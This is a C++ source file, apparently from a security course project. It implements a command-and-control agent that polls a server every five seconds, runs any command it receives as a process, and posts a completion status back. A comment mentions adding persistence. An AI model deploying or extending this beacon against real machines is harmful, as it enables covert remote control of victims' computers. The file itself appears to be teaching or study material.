#include "http.h"
#include "parserCreateProcess.h"
#include "json.hpp" //Source: https://github.com/nlohmann/json
#include <vector>

struct task {
	std::string job_id;
	std::string agent_id;
	std::string command;
	std::string status;
	std::string arguments;
	//std::vector<std::string> arguments;
};

int main(int argc, char* argv[]) {
	std::string taskResult;
	nlohmann::json taskResultJSON;
	std::vector<nlohmann::json> taskResultJSONVector;
	nlohmann::json singleTaskJSON;

	task current_task;

	int result;
	std::string outData;

	while(1) {
		// Listen to each task endpoint individually
		// do GET requests to see updates

		// Check for tasks
		//taskResult = makeHttpRequestGET("cs501-project.herokuapp.com", 443, "/tasks/create", 1);
		taskResult = makeHttpRequestGET("127.0.0.1", 5000, "/tasks/get-jobs", 0);
		printf("TASK RESULT: %s\n", taskResult.c_str());

		// If there's any task
		//{ "job_id": task.job_id, "agent_id":agent_id, "command":task_command, "arguments":[""] , "status": TASKED,}
		// printf("test123\n");

		if (taskResult != "") {
			// Parse GET request as JSON
    		taskResultJSON = nlohmann::json::parse(taskResult);

    		// Parse JSON array of tasks
		    for (auto& el : taskResultJSON.items()) {
		        taskResultJSONVector.push_back(el.value());
		    }

		    // Check all tasks at endpoint
		    for (auto& res: taskResultJSONVector) {

		    	current_task.job_id = res["job_id"];
		    	current_task.agent_id = res["agent_id"];
		    	current_task.command = res["command"];
		    	current_task.status = res["status"];
		    	current_task.arguments = res["arguments"];

		    	printf("Job ID: %s\nAgent ID: %s\nCommand: %s\nStatus: %s\nArguments: %s\n", current_task.job_id.c_str(), current_task.agent_id.c_str(), current_task.command.c_str(), current_task.status.c_str(), current_task.arguments.c_str());

				// If there's a task with status "CREATED", run task and set status to "COMPLETED"
				if (current_task.status == "CREATED") {
					//printf("hi\n");
				    result = runProcessCustom(current_task.job_id, current_task.agent_id, current_task.command, current_task.status, current_task.arguments);

				    outData = "{\'job_id\': \'";
				    outData.append(current_task.job_id);
				    outData.append("\', \'agent_id\': \'");
				    outData.append(current_task.agent_id);
				    outData.append("\', \'command\': \'");
				    outData.append(current_task.command);
				    outData.append("\', \'status\': \'DONE\'");
				    outData.append(", \'output\': \'n/a\'}");
				    printf("outData: %s\n", outData.c_str());
        			//makeHttpRequestPOST("cs501-project.herokuapp.com", 443, "/output", 1, outData);
        			makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);
        		}

				// If there's a task with status "COMPLETED", ignore task
		    }
		}

		Sleep(5000); // Wait 5 seconds in-between each series of GET requests
	}

	return 0;
}

//Steps:
// if status: CREATED -> run task
// if status: COMPLETED -> ignore
// Loop infinitely
// Edit persistence file to run parser?
